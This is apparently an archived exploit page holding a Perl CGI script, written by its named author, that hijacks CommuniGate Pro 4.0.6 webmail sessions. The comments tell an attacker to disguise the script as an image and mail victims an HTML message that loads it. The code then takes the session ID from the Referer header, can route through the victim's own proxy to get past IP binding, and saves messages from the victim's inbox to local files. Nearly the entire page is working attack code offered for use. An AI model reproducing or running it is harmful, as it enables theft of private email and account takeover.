<html><head><title>CommuniGate Pro Webmail 4.0.6 Session Hijacking Exploit 
</title></head><pre>#!/usr/bin/perl

# Below is exploit code. Place it into cgi-bin, then
# (recommended) make symlink from
# DocumentRoot/AnyImage.gif to shj.pl, configure
# at least $url variable, and possible other vars and
# send victim HTML message with img src to your
# AnyImage.gif. When victim will read message, script
# will download messages 1..10 from his mailbox (if
# sucessfull).

# Script will work even if &quot;require fixed address&quot; option
# enabled (set $abuseproxy=1), but it needs access to
# users proxy (IP will be detected automatically). So, if
# your victim uses same corporate proxy as you, then 
# you're lucky, you can own his mailbox! :)

# If victim uses HTTPS to access CGP webmail, use
# https:// link to image. some browsers will still send
# HTTP_REFERER if _both_ sites are https.
#
# session hijacking and mail downloading exploit for CommuniGatePro 4.0.6
#
# Yaroslav Polyakov. xenon@sysAttack.com www.sysAttack.com
#

use LWP::UserAgent;

# configuration vars
$logfile=&quot;/tmp/log&quot;;
$url=&quot;http://COMMUNIGATE/Session/%SID%/Message.wssp?Mailbox=INBOX&amp;MSG=%N%&quot;;
$SIDREGEXP=&quot;Session/([0-9a-zA-Z\-]+)/&quot;;
$msglonum=1;
$msghinum=10;
$msgprefix=&quot;/tmp/hijacked-&quot;;
$abuseproxy=1;
$proxyport=3128;

sub printgif
{
$gif1x1=&quot;\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00\xc0\xc0\xc0
\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00
\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b&quot;;


  print &quot;Content-Type: image/gif\n&quot;;
  print &quot;\n&quot;;
  print &quot;$gif1x1&quot;;
}


open LOG, &quot;&gt; $logfile&quot; || die(&quot;cant write to my log&quot;);
printgif;



$remote=$ENV{'REMOTE_ADDR'};
$referer=$ENV{'HTTP_REFERER'};
print LOG &quot;remote: $remote\nreferer: $referer\n&quot;;
# if($referer=~/SID=([0-9a-zA-Z\-]+)/){
if($referer=~/$SIDREGEXP/){
                $SID=$1;
                print LOG &quot;SID: $SID\n&quot;;
                }else{
                                print LOG &quot;sorry, cant
find out SID\n&quot;;
                                exit;
                }



# create request
my $ua = new LWP::UserAgent;
$ua-&gt;agent(&quot;shj - sysAttack CGP session HiJack/1.0&quot;);

if($abuseproxy){
                print LOG &quot;set proxy
http://$remote:$proxyport/\n&quot;;
                $ua-&gt;proxy('http',
&quot;http://$remote:$proxyport/&quot;);
}

for($index=$msglonum;$index&lt;=$msghinum;$index++){
               $eurl=$url;
                $eurl =~ s/%N%/$index/;
                $eurl =~ s/%SID%/$SID/;
                print LOG &quot;fetching $eurl\n&quot;;
                $request = new HTTP::Request(&quot;GET&quot;, $eurl);
                $response = $ua-&gt;request($request);
                if($response){
                                print LOG
$response-&gt;code.&quot; &quot;.$response-&gt;message
.&quot;\n&quot;;
                                open MSG, &quot;&gt;
$msgprefix$index&quot; or die('cant crea
te $msgprefix$index');
                                print MSG
$response-&gt;content;
                                close MSG;
                }else{
                                print LOG &quot;undefined
response\n&quot;;
                }
}
close LOG;



# milw0rm.com [2003-05-05]</pre></html>